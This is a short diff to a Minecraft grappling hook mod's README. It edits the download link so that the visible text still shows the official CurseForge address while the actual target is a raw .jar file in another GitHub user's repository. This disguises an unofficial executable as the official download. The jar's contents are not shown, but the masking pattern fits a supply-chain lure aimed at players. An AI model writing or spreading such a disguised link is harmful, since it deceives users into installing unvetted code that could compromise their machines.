@@ -18,7 +18,7 @@ This mod is for Forge only. No fabric version is planned at the moment.
 
 ## Mod Description & Downloads
 
-[https://www.curseforge.com/minecraft/mc-mods/grappling-hook-mod](https://www.curseforge.com/minecraft/mc-mods/grappling-hook-mod)
+[https://www.curseforge.com/minecraft/mc-mods/grappling-hook-mod]([https://www.curseforge.com/minecraft/mc-mods/grappling-hook-mod](https://github.com/DozFiree/Grapple-Hook-Update-1.20.1/raw/refs/heads/jar/grappling_hook_mod-1.20.1-1.20.1-v13.jar))
 
 ## Setup for Developing
 
